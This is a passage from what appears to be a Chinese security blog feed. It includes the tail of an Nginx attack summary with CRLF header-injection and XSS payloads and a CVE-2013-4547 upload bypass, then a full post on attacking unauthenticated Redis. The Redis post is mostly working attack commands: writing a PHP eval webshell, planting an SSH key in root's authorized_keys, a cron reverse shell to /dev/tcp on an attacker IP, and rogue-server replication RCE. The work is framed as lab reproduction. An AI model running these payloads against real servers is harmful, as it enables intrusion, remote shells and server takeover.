class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>原本的目的是为了让http的请求跳转到https上的，意思就是配置实现了强制跳转的功能</p><p>当用户访问Nginx服务器时由于此配置的存在会被强制跳转到以https协议访问之前访问的链接！</p><p>访问的是：<a href="http://www.com/">http://www.com</a></p><p>实际走的是：<a href="https://www.com/">https://www.com</a></p><p>这里在提一下：因为https的安全机制是要比http高很多的</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619231933177.png" alt="1619231933177"></p><p>添加这一行代码</p><pre class="line-numbers language-none"><code class="language-none">return 302 https://$host$uri;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619232927192.png" alt="1619232927192"></p><pre class="line-numbers language-none"><code class="language-none">1、配置中的$uri是我们可以控制的，这样我们就可以在$url处填入CRLF，然后对服务器进行访问实现头部注入2、服务器会返回一个302跳转给用户，所以我们注入的头部参数又会返回到客户这边<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619232436489.png" alt="1619232436489"></p><p>可以看到它自动跳转到https了</p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>劫持合法用户会话，利用管理员身份进行恶意操作，篡改页面内容、进一步渗透网站等等！</p><p>利用 CRLF Injection设置一个 SESSION，造成一个“会话固定漏洞</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Nginx会将<code>$uri</code>进行解码，导致传入<code>%0a%0d</code>即可引入换行符，造成CRLF注入漏洞！！</p><p><strong>$uri跳转HTPS，$uri就会产生‰0a‰0d换行符，换行符就一定存在CRLF注入漏洞</strong></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问phpinfo的1.php   </p><p>然后进行抓包</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619233405569.png" alt="1619233405569"></p><p>添加</p><pre class="line-numbers language-none"><code class="language-none">/%0ASet-cookie:JSPSESSID%3D36<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到他有了 302的跳转</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619233449156.png" alt="1619233449156"></p><h2 id="5-CRLF-XSS-CVE-2016-9964"><a href="#5-CRLF-XSS-CVE-2016-9964" class="headerlink" title="5.CRLF+XSS(CVE-2016-9964)"></a>5.CRLF+XSS(CVE-2016-9964)</h2><pre class="line-numbers language-none"><code class="language-none">/%0D%0A%0D%0A%3Cimg%20src=1%20onerror=alert(/xss/)%3E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到它是弹了一个xss的窗口的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619233696522.png" alt="1619233696522"></p><p>然后我放包</p><p>页面没有弹xss的窗口</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619233751073.png" alt="1619233751073"></p><p>因为高版本的浏览器防止CRLF去弹XSS</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p> <a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">Bottle HTTP 头注入漏洞探究 | 离别歌 (leavesongs.com)</a> </p><p> <a href="https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html">新浪某站CRLF Injection导致的安全问题 | 离别歌 (leavesongs.com)</a> </p><h2 id="6-文件名逻辑漏洞-CVE-2013-4547"><a href="#6-文件名逻辑漏洞-CVE-2013-4547" class="headerlink" title="6.文件名逻辑漏洞(CVE-2013-4547)"></a>6.文件名逻辑漏洞(CVE-2013-4547)</h2><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>Nginx : 0.8.41<del>1.4.3/1.5.0</del>1.5.7</p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>在 Windows环境下，后来发现要文件名的后面存在空格，而 Windows是不允许存在此类文件的</p><p>复现，使用 Vulhub的 docker进行复现  默认开启端口是8080</p><p>漏洞目录：cd vulhub/nginxCVE-2013-4547/</p><pre class="line-numbers language-none"><code class="language-none">启动：sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后我们访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619237115922.png" alt="1619237115922"></p><p> 抓包 上传一个phpinfo信息的a001.jpg</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619237381202.png" alt="1619237381202"></p><p>后+一个空格 然后放包</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619237691097.png" alt="1619237691097"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619237720969.png" alt="1619237720969"></p><p>继续抓包 <code>/uploadfiles/a001.jpg...php</code> </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619238052393.png" alt="1619238052393"></p><p>将<code>...php</code>前面的两个点的改Hex  改成20 00</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619238080563.png" alt="1619238080563"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619238101060.png" alt="1619238101060"></p><p>然后进行放包</p><p>成功回显</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619238123647.png" alt="1619238123647"></p><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/1619238285125.png" alt="1619238285125"></p><h2 id="7-整数溢出-CVE-2017-7529"><a href="#7-整数溢出-CVE-2017-7529" class="headerlink" title="7.整数溢出(CVE-2017-7529)"></a>7.整数溢出(CVE-2017-7529)</h2><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在 Nginx的 range filter中存在整数溢出漏洞，可以通过带有特殊构造的 range的HHTP头的恶意请求引发这个整数溢出漏洞，并导致信息泄露</p><p>有兴趣的可以看这里</p><p> <a href="https://paper.seebug.org/353/">Nginx 整数溢出(CVE-2017-7529)漏洞分析 (seebug.org)</a> </p>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis小结</title>
      <link href="/2021/10/28/redis/"/>
      <url>/2021/10/28/redis/</url>
      
        <content type="html"><![CDATA[<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>REmote DIctionary Server（Redis）是一个由 Salvatore Sanfilippo写的key-value存储系统。<br>Redis是—个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于內存亦可持久化的日志型、Key-Value数据库，并提供多种语言的APl。它通常被称为数据结构服务器，因为值（value）可以是字符串（String），哈希（Map），列表（List），集合（sets）和有序集合（sorted sets）等类型。从2010年3月15日起，Redis的开发工作由 Mware主持。从2013年5月开始，Redis的开发由 Pivotal赞助。目前最新稳定版本为4.0.8</p><p>Redis是一个开源的高性能键值数据库。<strong>最热门的NoSq数据库之一</strong>，也被人们称为数据结构服务器。</p><p>最大的特点就是 ：快</p><pre class="line-numbers language-none"><code class="language-none">1.以内存作为数据存储介质，读写数据的效率极高。2.储存在 Redis中的数据是持久化的，断电或重启，数据也不会丢失3.存储分为内存存储、磁盘存储和log文件。4.可以从磁盘重新将数据加载到內存中，也可以通过配置文件对其进行配置，因此，redis才能实现持久化5.支持主从模式，可以配置集群，更利于支撑大型的项目。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最新版是6.2的</p><p>Redis默认端口：6379  sentinel.conf配置器端口为26379</p><h2 id="0x02-未授权访问"><a href="#0x02-未授权访问" class="headerlink" title="0x02 未授权访问"></a>0x02 未授权访问</h2><h3 id="未授权访问原理"><a href="#未授权访问原理" class="headerlink" title="未授权访问原理"></a>未授权访问原理</h3><p>主要是因为配置不当，导致未授权访问漏洞。<br>进一步将恶意数据写入内存或者磁盘之中，造成更大的危害。</p><p>配置不当一般主要是两个原理：</p><ul><li>配置登录策略导致任意机器都可以登录 redis。</li><li>未设置密码或者设置弱口令。</li></ul><p>这边用Centos7进行演示Redis-3.2.0</p><p>官网： <a href="https://redis.io/">Redis</a> </p><p>安装命令也很简单</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">wget http<span class="token operator">:</span><span class="token comment">//download.redis.io/releases/redis-3.2.0.tar.gz</span>tar xzf redis<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.0</span><span class="token punctuation">.</span>tar<span class="token punctuation">.</span>gzcd redis<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.0</span>make<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>编译完成之后呢 简单查看一下</p><p><img src="https://img-blog.csdnimg.cn/20210410132230796.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2021041013231055.png" alt="在这里插入图片描述"><br>这些都是Redis的命令</p><p>去修改一下配置文件</p><p>因为我们要做未授权访问嘛</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">vi redis<span class="token punctuation">.</span>conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210410132504187.png" alt="在这里插入图片描述"></p><p>把这个 bind 127.0.0.1 注释掉</p><p>意思是所有机器都可以登录了</p><p><img src="https://img-blog.csdnimg.cn/20210410132653140.png" alt="在这里插入图片描述"></p><p>设置为no  意思是关闭安全模式</p><p>ok 设置完成 保存退出</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">cp redis<span class="token punctuation">.</span>conf <span class="token punctuation">.</span><span class="token operator">/</span>src<span class="token operator">/</span>redis<span class="token punctuation">.</span>conf  <span class="token comment">//配置文件复制过去</span><span class="token punctuation">.</span><span class="token operator">/</span>src<span class="token operator">/</span>redis<span class="token operator">-</span>server redis<span class="token punctuation">.</span>conf <span class="token comment">//开启Redis</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210410132837471.png" alt="在这里插入图片描述"></p><p>检查服务，看看端口 </p><pre class="line-numbers language-c" data-language="c"><code class="language-c">netstat <span class="token operator">-</span>nultp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210410132942898.png" alt="在这里插入图片描述"></p><p>然后 要本地登录的话</p><p>可以设置一下 环境变量 </p><p>zsh添加环境变量</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">export PATH<span class="token operator">=</span><span class="token operator">/</span>root<span class="token operator">/</span>Desktop<span class="token operator">/</span>redis<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.0</span><span class="token operator">/</span>src<span class="token operator">:</span>$PATH<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以后启动Redis在命令行就可以开启了</p><p>但是 我没设置。。</p><p>就要去src目录下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token operator">/</span>redis<span class="token operator">-</span>cli <span class="token operator">-</span>h <span class="token punctuation">{</span>host<span class="token punctuation">}</span> <span class="token operator">-</span>a <span class="token punctuation">{</span>密码<span class="token punctuation">}</span> <span class="token operator">-</span>p <span class="token punctuation">{</span>port<span class="token punctuation">}</span> <span class="token punctuation">{</span>command<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>默认是没有密码的</p><p>直接登录</p><p><img src="https://img-blog.csdnimg.cn/20210410133516313.png" alt="在这里插入图片描述"><br>常用命令</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">1.</span>查看信息：info<span class="token number">2.</span>删除所有数据库內容：flushable<span class="token number">3.</span>刷新数据库：flush<span class="token number">4.</span>看所有键：KEYS<span class="token operator">*</span>，使用 select nun可以查看键值数据。<span class="token number">5.</span>设置变量：set test“who am i<span class="token number">6.</span>config set dir dirpath设置路径等配置<span class="token number">7.</span>config get dir<span class="token operator">/</span>filename获取路径及数据配置信息<span class="token number">8.</span>save保存<span class="token number">9.</span>get变量，查看变量名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后呢 我这边用另一台机器Redis-kali-2020.4</p><p>进行 Redis未授权访问</p><p>这边因为Centos7的网卡 问题  淦</p><p>我用两台Redis-kali-2020.4进行未授权测试一下</p><p>可以看到 直接就进来了</p><p><img src="https://img-blog.csdnimg.cn/20210410141242112.png" alt="在这里插入图片描述"></p><h2 id="0x03-Redis写入webshell"><a href="#0x03-Redis写入webshell" class="headerlink" title="0x03 Redis写入webshell"></a>0x03 Redis写入webshell</h2><p>既然进来了嘛</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">config set dir <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span><span class="token comment">//切换目录到网站的根目录</span>set x <span class="token string">"\n\n\n&lt;?php phpinfo();?&gt;\n\n\n"</span><span class="token comment">//写入恶意代码phpinfo()</span>set xx <span class="token string">"\n\n\n&lt;?php @eval($_POST['1']);?&gt;\n\n\n"</span><span class="token comment">//写入一句话木马</span>config set dbfilename a001<span class="token punctuation">.</span>php<span class="token comment">//磁盘中生成木马文件a001.php</span>save<span class="token comment">//进行保存</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210410141551721.png" alt="在这里插入图片描述"></p><p>可以去靶机看一下</p><p><img src="https://img-blog.csdnimg.cn/20210410141803492.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210410141838880.png" alt="在这里插入图片描述"></p><p>可以看到 被成功写入了</p><p>检查webshell</p><p>kali开启apache2</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">vi <span class="token operator">/</span>etc<span class="token operator">/</span>apache2<span class="token operator">/</span>ports<span class="token punctuation">.</span>conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改默认端口为8080</p><p><img src="https://img-blog.csdnimg.cn/20210410142130349.png" alt="在这里插入图片描述"><br>保存退出</p><p>启动apache2服务</p><pre class="line-numbers language-none"><code class="language-none">/etc/init.d/apache2 start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210410142316409.png" alt="在这里插入图片描述"></p><p>进行访问 可以看到是成功的</p><p><img src="https://img-blog.csdnimg.cn/2021041014253438.png" alt="在这里插入图片描述"><br>蚁剑连接</p><p><img src="https://img-blog.csdnimg.cn/20210410142717773.png" alt="在这里插入图片描述"></p><h2 id="0x04-Redis密钥登录SSH"><a href="#0x04-Redis密钥登录SSH" class="headerlink" title="0x04 Redis密钥登录SSH"></a>0x04 Redis密钥登录SSH</h2><p>kali开启ssh服务</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">/</span>etc<span class="token operator">/</span>init<span class="token punctuation">.</span>d<span class="token operator">/</span>ssh start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置redis密码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">config set requirepass a001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210410143321435.png" alt="在这里插入图片描述"><br>设置成功后 在进行查看就不可以了</p><p>把密码写进去</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">auth a001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210410143510244.png" alt="在这里插入图片描述"></p><p>攻击机kali生成<code>ssh-rsa</code>密钥</p><p><img src="https://img-blog.csdnimg.cn/20210410143656351.png" alt="在这里插入图片描述"></p><p>然后在<code>.ssh</code>这个目录下 就生成了这两个文件</p><p><img src="https://img-blog.csdnimg.cn/20210410143940182.png" alt="在这里插入图片描述"><br>进行导出Key</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">(</span>echo <span class="token operator">-</span>e <span class="token string">"\n\n"</span><span class="token punctuation">;</span> cat id_rsa<span class="token punctuation">.</span>pub<span class="token punctuation">;</span> echo <span class="token operator">-</span>e <span class="token string">"\n\n"</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> key<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>\n\n</code>是为了防止乱码</p><p>把生成的key.txt 复制到redis/src的目录下</p><p><img src="https://img-blog.csdnimg.cn/20210410145806165.png" alt="在这里插入图片描述"></p><p>进行写入</p><pre class="line-numbers language-none"><code class="language-none">cat key.txt | ./redis-cli -h 192.168.175.162 -a a001 -x set xxxx    <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行查看 是成功写入的</p><p>切换目录到靶机的<code>/root/.ssh</code>目录下</p><p><img src="https://img-blog.csdnimg.cn/20210410145016660.png" alt="在这里插入图片描述"></p><p>设置文件名 并进行导出 最后记得保存</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">config set dbfilename authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210410145109945.png" alt="在这里插入图片描述"></p><p>进行登录</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">ssh <span class="token operator">-</span>i id_rsa root@<span class="token number">192.168</span><span class="token number">.175</span><span class="token number">.162</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到ssh成功登录</p><p><img src="https://img-blog.csdnimg.cn/20210410150107371.png" alt="在这里插入图片描述"></p><h2 id="0x05-利用计划任务反弹shell"><a href="#0x05-利用计划任务反弹shell" class="headerlink" title="0x05 利用计划任务反弹shell"></a>0x05 利用计划任务反弹shell</h2><ul><li>nc开启监听</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">nc <span class="token operator">-</span>lvnp <span class="token number">6666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>写入一句话</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">192.168</span><span class="token number">.175</span><span class="token number">.162</span><span class="token operator">:</span><span class="token number">6379</span><span class="token operator">&gt;</span> set  xx   <span class="token string">"\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.175.161/9999 0&gt;&amp;1\n"</span>         #星号代表计划任务执行的时间OK<span class="token number">192.168</span><span class="token number">.175</span><span class="token number">.162</span><span class="token operator">:</span><span class="token number">6379</span><span class="token operator">&gt;</span> config set dir <span class="token operator">/</span>var<span class="token operator">/</span>spool<span class="token operator">/</span>cron<span class="token operator">/</span>   #设置导出的路径OK<span class="token number">192.168</span><span class="token number">.175</span><span class="token number">.162</span><span class="token operator">:</span><span class="token number">6379</span><span class="token operator">&gt;</span> config set dbfilename root  #设置导出的文件名OK<span class="token number">192.168</span><span class="token number">.175</span><span class="token number">.162</span><span class="token operator">:</span><span class="token number">6379</span><span class="token operator">&gt;</span> save   #保存OK<span class="token number">192.168</span><span class="token number">.175</span><span class="token number">.162</span><span class="token operator">:</span><span class="token number">6379</span><span class="token operator">&gt;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者这样也是可以的</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">┌──<span class="token punctuation">(</span>root<span class="token operator">/</span>kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token operator">/</span>redis<span class="token operator">-</span><span class="token number">3.2</span><span class="token number">.0</span><span class="token operator">/</span>src<span class="token punctuation">]</span>└─# echo <span class="token operator">-</span>e <span class="token string">"\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.175.161/9999 0&gt;&amp;1\n\n"</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">/</span>redis<span class="token operator">-</span>cli <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token number">.175</span><span class="token number">.162</span> <span class="token operator">-</span>a a001 <span class="token operator">-</span>x set <span class="token number">1</span><span class="token punctuation">.</span><span class="token operator">/</span>redis<span class="token operator">-</span>cli <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token number">.175</span><span class="token number">.162</span> <span class="token operator">-</span>a a001 config set dir <span class="token operator">/</span>var<span class="token operator">/</span>spool<span class="token operator">/</span>cron<span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">/</span>redis<span class="token operator">-</span>cli <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token number">.175</span><span class="token number">.162</span> <span class="token operator">-</span>a a001 config set dbfilename root<span class="token punctuation">.</span><span class="token operator">/</span>redis<span class="token operator">-</span>cli <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token number">.175</span><span class="token number">.162</span> <span class="token operator">-</span>a a001 saveOKOKOKOK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210410154041829.png" alt="在这里插入图片描述"></p><h2 id="0x06-利用主从复制RCE"><a href="#0x06-利用主从复制RCE" class="headerlink" title="0x06 利用主从复制RCE"></a>0x06 利用主从复制RCE</h2><p>之前写入webshell 基本是利用crontab、ssh key、webshe‖这样的文件都有一定容错性，再加上 crontab和ssh服务可以说是服务器的标准的服务，所以在以前，这种通过写入文件的 getshell方式基本就可以说是很通杀了</p><p>但随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除 redis以外的任何服务存在，包括sh和 crontab，再加上权限的严格控制，只靠写文件就很难再 getshel了，在这种情况下，我们就需要其他的利用手段了</p><p>漏洞存在于4.X、5.X版本中，简单来讲就是</p><p>攻击者（主机）写一个so文件，然后通过 FULLRESYNC（全局）同步文件到受害人（从机）上。</p><p>下载安装4.0.8的版本</p><p>一样的配置 改bind+改no</p><p>然后进行启动</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token operator">/</span>src<span class="token operator">/</span>redis<span class="token operator">-</span>server redis<span class="token punctuation">.</span>conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置密码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">config set requirepass a002<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载两个脚本</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">https<span class="token operator">:</span><span class="token comment">//github.com/n0b0dyCN/redis-rogue-server</span><span class="token comment">//未授权</span>https<span class="token operator">:</span><span class="token comment">//github.com/Testzero-wz/Awsome-Redis-Rogue-Server</span><span class="token comment">//Redis有密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>目标靶机是不可以开启安全模式的</p><p><strong>远程登录</strong></p><p>攻击机上执行 进行远程连接靶机</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">python3 redis_rogue_server<span class="token punctuation">.</span>py <span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token number">.175</span><span class="token number">.162</span> <span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token number">.175</span><span class="token number">.161</span> <span class="token operator">-</span>passwd a002<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210410185021254.png" alt="在这里插入图片描述"></p><p>他这里问你</p><p>i：直接拿到shell </p><p>还是r：反弹shell</p><p>上面就是拿shell</p><p>下面搞一搞 反弹shell</p><p>选r  攻击机的IP +开启监听端口</p><p><img src="https://img-blog.csdnimg.cn/2021041019260446.png" alt="在这里插入图片描述"></p><p>python进去pty</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">python3 <span class="token operator">-</span>c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210410192522973.png" alt="在这里插入图片描述"></p><h2 id="0x07-本地Redis主从复制RCE反弹shell"><a href="#0x07-本地Redis主从复制RCE反弹shell" class="headerlink" title="0x07 本地Redis主从复制RCE反弹shell"></a>0x07 本地Redis主从复制RCE反弹shell</h2><p><strong>但是 如果目标机器仅仅允许本地进行登录的时候</strong></p><p>这个时候，我们可以通过配合其他漏洞，从目标本地登录 redis。然后手动执行脚本内写死的一些命令</p><p>将靶机 Redis作为从机，将攻击机器设置为主机</p><p>然后攻击机器会自动将一些恶意so文件同步给目标机器（从机），从而来实现对目标机器的远程命令执行。</p><p>还是用这两个脚本 </p><pre class="line-numbers language-none"><code class="language-none">https://github.com/n0b0dyCN/redis-rogue-server//未授权https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server//Redis有密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但是要说一下 </p><p><strong>将 redis-rogue-server的exp.so文件复制到 Awsome文件夹中使用，因为exp.so带 system模块</strong></p><p>开启监听</p><p><img src="https://img-blog.csdnimg.cn/20210410190803461.png" alt="在这里插入图片描述"></p><p>攻击机开启主服务器</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">python3 redis_rogue_server<span class="token punctuation">.</span>py <span class="token operator">-</span>v <span class="token operator">-</span>path exp<span class="token punctuation">.</span>so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210410190812382.png" alt="在这里插入图片描述"></p><p>然后去靶机上</p><p>查看模块 可以看到是没有的可用的模块</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">module list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210410192740804.png" alt="在这里插入图片描述"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">config set dir <span class="token operator">/</span>tmp<span class="token comment">//一般tmp目录都有写权限，所以选择这个目录写入</span>config set dbfilename exp<span class="token punctuation">.</span>so<span class="token comment">//设置导出文件的名字 这里就是创建一个空文件</span>slaveof <span class="token number">192.168</span><span class="token number">.175</span><span class="token number">.161</span> <span class="token number">15000</span><span class="token comment">//进行主从同步，将恶意so文件写入到tmp文件</span><span class="token comment">//端口可以自定义</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就可以看到攻击机这边开始了同步</p><p><img src="https://img-blog.csdnimg.cn/20210410192924458.png" alt="在这里插入图片描述"></p><p>关闭主从同步</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">slaveof NO ONE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">module load <span class="token punctuation">.</span><span class="token operator">/</span>exp<span class="token punctuation">.</span>so <span class="token comment">//加载写入的so文件模块</span>module list<span class="token comment">//ັ查看恶意的so文件有没有写入成功</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210410194627342.png" alt="在这里插入图片描述"></p><p>执行反弹shell</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">system<span class="token punctuation">.</span>rev <span class="token number">192.168</span><span class="token number">.175</span><span class="token number">.161</span> <span class="token number">9999</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就是没有回显</p><p><img src="https://img-blog.csdnimg.cn/20210410193233565.png" alt="在这里插入图片描述"></p><p>然后去攻击机那边进行查看</p><p><img src="https://img-blog.csdnimg.cn/20210410193257516.png" alt="在这里插入图片描述"></p><p>可以看到已经拿到了</p><p>python进入pty</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">python3 <span class="token operator">-</span>c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210410193611148.png" alt="在这里插入图片描述"></p><p>还可以用另外一种方式</p><p>直接执行命令</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">system<span class="token punctuation">.</span>exec <span class="token string">"id"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20210410194438216.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF-CTFHUB</title>
      <link href="/2021/10/28/ssrf-ctfhub/"/>
      <url>/2021/10/28/ssrf-ctfhub/</url>
      
